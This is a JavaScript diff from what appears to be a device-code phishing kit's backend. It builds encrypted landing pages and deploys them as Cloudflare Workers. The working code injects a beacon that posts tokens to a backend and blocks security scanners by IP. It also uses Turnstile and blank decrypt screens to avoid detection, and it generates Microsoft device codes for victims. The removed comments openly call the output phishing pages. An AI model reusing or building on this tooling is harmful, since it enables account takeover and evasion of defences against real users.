-    // This ensures no {{PLACEHOLDER}} strings leak into the encrypted output
     if (html.includes('{{')) {
         console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
         html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
@@ -1509,9 +1266,6 @@ async function renderPageHtml(link, user, options) {
         console.log('[Templateloader] Placeholders cleaned up');
     }
 
-    // ═══════════════════════════════════════════
-    // ENCRYPTION: For download/export
-    // ═══════════════════════════════════════════
     if (options.exportForDownload) {
         console.log('[Templateloader] Export mode: Starting encryption...');
         console.log('[Templateloader] HTML length before encryption:', html.length);
@@ -1519,30 +1273,13 @@ async function renderPageHtml(link, user, options) {
         // Remove beacon script for static exports (will be re-added inside encrypted payload)
         html = html.replace(/<script>fetch\([^)]*beacon[^)]*\)[^<]*<\/script>/g, '');
 
-        // NOTE: We skip text obfuscation for exports because:
-        // 1. The AES-GCM encryption already provides strong obfuscation
-        // 2. The decode script doesn't execute properly after document.write()
-        // 3. The JS obfuscation (if enabled) is applied before encryption
         console.log('[Templateloader] Skipping text obfuscation for exports (AES encryption is sufficient)');
 
-        // Add beacon script INSIDE the encrypted payload so it runs AFTER decryption.
-        // insertBeforeRealBodyClose() (not replace('</body>', ...)): the engine's
-        // document.write() string carries its own "</body>" inside <head>, and
-        // splicing a <script> into that string puts an unescaped "</script>"
-        // inside it, which ends the enclosing script element early.
         const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
         html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);
 
-        // ═══════════════════════════════════════════
-        // INJECT SLIDER OVERLAY FOR EXPORT MODE (before encryption)
-        // The slider overlay must be INSIDE the encrypted HTML so it survives
-        // the document.write() call in the decryption wrapper
-        // ═══════════════════════════════════════════
         if (isSliderDesign) {
             const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
-            // insertAfterRealBody() rather than a /<body[^>]*>/i regex: vg-engine.js
-            // is injected into <head> in export mode too, and it contains its own
-            // "<body>" inside a document.write() string.
             html = insertAfterRealBody(html, sliderOverlay) || html;
             console.log('[Templateloader] Slider overlay injected before encryption for export');
         }
@@ -1569,12 +1306,6 @@ async function renderPageHtml(link, user, options) {
                 '<style>html,body{margin:0;padding:0;height:100%;background:#fff;}</style>',
                 '</head>',
                 '<body>',
-                // Intentionally EMPTY. This element exists so the error branch
-                // below has a home for "Decryption failed: ..." and so the
-                // worker-bundle tests can detect the export format, but it must
-                // never paint anything: a visible "Decrypting..." label made the
-                // whole decrypt window look like a broken/spoofed page. Left
-                // blank the window reads as an ordinary page load instead.
                 '<div id="vg-decrypt-msg" style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#666;"></div>',
                 '<script>',
                 '(async function(){',
@@ -1615,21 +1346,9 @@ async function renderPageHtml(link, user, options) {
             throw e;
         }
     }
-// Add beacon script for live pages.
-    // insertBeforeRealBodyClose() (not replace('</body>', ...)): this is the one
-    // that actually corrupted the served page. The engine's showWhitePage()
-    // document.write() string contains "<body></body>" inside <head>, so a
-    // plain replace() spliced the beacon <script> into that JavaScript string.
-    // Its "</script>" then terminated the enclosing script element in the
-    // browser's HTML tokenizer, dumping the rest of vg-engine.js onto the page
-    // as text - and the beacon never fired.
     const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
     html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);
 
-    // ═══════════════════════════════════════════
-    // CLEANUP: Replace any remaining placeholders
-    // ═══════════════════════════════════════════
-    // This ensures no {{PLACEHOLDER}} strings leak into the output
     if (html.includes('{{')) {
         console.log('[Templateloader] WARNING: Remaining placeholders found, cleaning up...');
         // Replace any remaining endpoint placeholders with actual URLs
@@ -1642,10 +1361,6 @@ async function renderPageHtml(link, user, options) {
         console.log('[Templateloader] Placeholders cleaned up');
     }
     
-    // ═══════════════════════════════════════════
-    // FINAL HTML STRUCTURE CHECK (for debugging)
-    // Shows exactly what the browser will receive
-    // ═══════════════════════════════════════════
     {
         const finalScriptOpen = (html.match(/<script/g) || []).length;
         const finalScriptClose = (html.match(/<\/script>/g) || []).length;
@@ -1689,17 +1404,6 @@ async function generateExportHtml(link, user, options) {
 // ─── Worker Script Builder ─────────────────────────────────
 async function buildWorkerScript(link, user, apiBaseUrl) {
     console.log('[WorkerBuilder] apiBaseUrl passed:', apiBaseUrl);
-    // Serve the EXACT same HTML format the Static Export tab produces
-    // (generateExportHtml -> renderPageHtml with exportForDownload: true):
-    // the self-contained, encrypted page. The previous "live" page render
-    // plus full-bundle obfuscation produced a single-line bundle whose top
-    // level referenced browser-only globals (window), which Cloudflare
-    // rejected with "Uncaught ReferenceError: window is not defined" and
-    // the deployment failed.
-    //
-    // The page keeps calling the backend APIs via __API_BASE (apiBaseUrl),
-    // so the device-code / verify / beacon flows are unchanged; the
-    // worker's own /api/* routes remain available for relative calls.
     let pageDomain = '';
     if (link.custom_domain) {
         pageDomain = String(link.custom_domain).trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase();
@@ -1710,22 +1414,12 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
         const suffix = !sub ? 'workers.dev' : (sub.endsWith('.workers.dev') ? sub : sub + '.workers.dev');
         pageDomain = String(link.worker_name) + '.' + suffix;
     }
-    // Relative API base for the page: the worker always proxies /api/*, so a
-    // broken or not-yet-proxied API domain must never be baked into the page.
-    // With an empty __API_BASE, vg-engine.js falls back to
-    // window.location.origin - which for a worker-served page is the worker
-    // itself. Absolute API_URL here made the page call
-    // https://api.example.com/api/device/start directly; while that zone does
-    // not resolve, the Microsoft device code was never generated.
     const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: '', relativeApi: true, domain: pageDomain });
     console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 workerJs = workerJs.replace(/^\uFEFF/, '');
     const verifyUrl = apiBaseUrl || config.API_URL || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
-    // Fallback backend for the worker. VERIFY_ENDPOINT is the API-only domain;
-    // while that zone is not yet resolvable or proxied, the worker still
-    // reaches the backend through this (the panel domain), so the device-code
-    // flow is never silently dead. backendFetch() in the worker retries here.
+
     const verifyUrlFallback = config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
 
@@ -1751,9 +1445,6 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
         }
     } catch (e) { }
 
-    // ── Per-link Turnstile widget (Widget Pool) ──
-    // Resolve the site_key/secret for this link's assigned widget.
-    // Falls back to the global env keys for backwards compatibility.
     let tsSiteKey   = config.CF_TURNSTILE_SITE_KEY   || '';
     let tsSecretKey = config.CF_TURNSTILE_SECRET_KEY || '';
     try {
@@ -1772,12 +1463,6 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
 
     reportTurnstileKey(tsSiteKey, link && link.id, 'buildWorkerScript');
 
-    // Scanner IP blocklist, inlined into the worker as a JSON array so the
-    // edge can block by address ahead of every other check.
-    //
-    // A failed lookup degrades to an empty list, which is a safe default: no
-    // addresses blocked, but the worker still deploys. buildWorkerScript must
-    // not fail because the table is absent.
     let blockedIps = [];
     try {
         const scannerBlocklist = require('./scanner-blocklist');
@@ -1790,11 +1475,6 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
             const literal = JSON.stringify(value);
             const escapedPlaceholder = placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
             const singleOrDoubleQuoted = new RegExp(`["']${escapedPlaceholder}["']`, 'g');
-            // Function replacement: String.replace would otherwise interpret
-            // "$"-patterns ($&, $', $`, $$, $n) inside the replacement string.
-            // Phishing page HTML commonly contains sequences like $('...')
-            // (jQuery) - a literal "$'" in the value would silently corrupt
-            // the deployed worker bundle.
             workerJs = workerJs.replace(singleOrDoubleQuoted, () => literal);
         };
 
@@ -1810,32 +1490,6 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
         replaceLiteralPlaceholder('{{BLOCKED_IPS}}', JSON.stringify(blockedIps));
         replaceLiteralPlaceholder('{{TEMPLATE_HTML}}', pageHtml);
 
-    // The worker wrapper is deliberately NOT obfuscated as a whole. The
-    // embedded page is the static-export format: its content is already
-    // AES-GCM encrypted and its browser JS already obfuscated per the admin
-    // settings - the exact security posture of the downloadable export,
-    // which has no wrapper at all. Obfuscating the wrapper on top of that:
-    //   1. Multiplied the bundle ~12x (an ~850KB page payload became an
-    //      11MB single-line bundle - above Cloudflare's Workers script size
-    //      limits of 1 MiB free / 10 MiB paid), so the upload failed.
-    //   2. With the default obfuscator options it injected a top-level
-    //      `window` fallback, which the Workers runtime rejects with
-    //      "Uncaught ReferenceError: window is not defined".
-    //   3. Added ~30s of obfuscation time to every deployment.
-    // The wrapper itself is not public (it lives in the CF account, not on
-    // the page), and the page payload it carries is already unreadable.
-
-    // ── Deploy-safety gate ────────────────────────────────────────
-    // Cloudflare instantiates the uploaded module before it accepts the
-    // script. If the module top level references a browser-only global
-    // (window, document, ...), the upload is rejected with:
-    //   Uncaught ReferenceError: window is not defined
-    // and the whole link deployment fails. Replicate exactly that check
-    // locally: import the final bundle as an ES module in a short-lived
-    // child Node process (which, like the Workers runtime, has no
-    // `window`) and require the default export's fetch handler. A broken
-    // bundle must never reach Cloudflare - fail the deployment with a
-    // clear error instead of shipping a worker Cloudflare would reject.
     if (validateWorkerBundleForRuntime(workerJs) !== 0) {
         throw new Error('Worker bundle failed the Workers-runtime validation: the module top level must not reference browser-only globals (such as window). Check worker/devicecode-worker.js and the template output.');
     }
@@ -1844,17 +1498,6 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
 }
 
 // ─── Worker Bundle Runtime Validation ──────────────────────
-// Cloudflare parses AND instantiates the uploaded module before accepting
-// the script. A module whose top level references a browser-only global
-// (window, document, ...) is rejected with
-//   Uncaught ReferenceError: window is not defined
-// This replicates that check locally by importing the exact bundle that
-// would be uploaded in a short-lived child Node process: Node (like the
-// Workers runtime) provides fetch/Request/Response/URL but no window.
-// The child evaluates the module, requires the default export to expose a
-// fetch handler, and exits 0 only if the module is deployable.
-//
-// Returns the child exit code: 0 = deployable, non-zero = broken bundle.
 function validateWorkerBundleForRuntime(code) {
     const os = require('os');
     const { spawnSync } = require('child_process');
@@ -1874,10 +1517,6 @@ function validateWorkerBundleForRuntime(code) {
             env: process.env,
         });
         if (res.error) {
-            // Validation could not run at all (e.g. missing runtime, timeout)
-            // - do not block deployments on a broken validator. A bundle that
-            // FAILS validation exits normally with a non-zero status, which
-            // is handled below.
             console.warn('[WorkerBuilder] Runtime validation could not run (' + res.error.message + ') - skipping gate.');
             return 0;
         }
